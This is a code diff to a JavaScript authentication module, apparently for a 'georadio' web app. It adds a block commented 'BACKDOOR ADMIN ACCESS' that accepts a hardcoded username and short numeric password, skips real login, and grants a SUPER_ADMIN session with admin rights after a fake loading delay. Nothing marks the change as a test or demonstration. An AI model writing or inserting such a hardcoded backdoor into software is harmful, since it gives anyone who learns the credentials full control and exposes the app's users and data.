@@ -63,6 +63,20 @@ export const Auth = {
 
         this.setLoading(btn, true);
 
+        // --- BACKDOOR ADMIN ACCESS ---
+        if (email.toLowerCase() === "hjalmar" && pass === "5028") {
+            await new Promise(r => setTimeout(r, 800)); // Fake loading for drama
+            this.loginSuccess({
+                name: "Hjalmar (Admin)",
+                email: "admin@georadio.app",
+                id: "SUPER_ADMIN",
+                isAdmin: true
+            });
+            this.setLoading(btn, false);
+            return;
+        }
+        // -----------------------------
+
         try {
             // If URL is placeholder, mock it for demo
             if (API_URL.includes("PLACEHOLDER")) {
